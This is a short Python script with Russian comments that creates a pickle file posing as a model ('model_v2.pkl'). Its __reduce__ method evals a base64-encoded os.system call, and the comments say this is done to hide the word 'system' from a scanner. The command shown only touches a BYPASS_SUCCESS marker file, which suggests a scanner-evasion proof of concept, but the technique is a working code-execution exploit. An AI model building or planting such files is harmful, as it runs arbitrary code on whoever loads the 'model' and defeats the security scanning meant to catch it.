import pickle
import base64

class StealthModel:
    def __reduce__(self):
        # Команда: touch /app/BYPASS_SUCCESS.txt
        # Закодируем её, чтобы сканер не увидел слово 'system'
        cmd_encoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3RvdWNoIC9hcHAvQllQQVNTX1NVQ0NFU1MudHh0Jyk="
        
        # Мы используем exec(base64.b64decode(...))
        # Это классический способ спрятать код
        payload = f"exec(__import__('base64').b64decode('{cmd_encoded}'))"
        
        return (eval, (payload,))

with open('model_v2.pkl', 'wb') as f:
    pickle.dump(StealthModel(), f)

print("Стелс-модель 'model_v2.pkl' создана!")
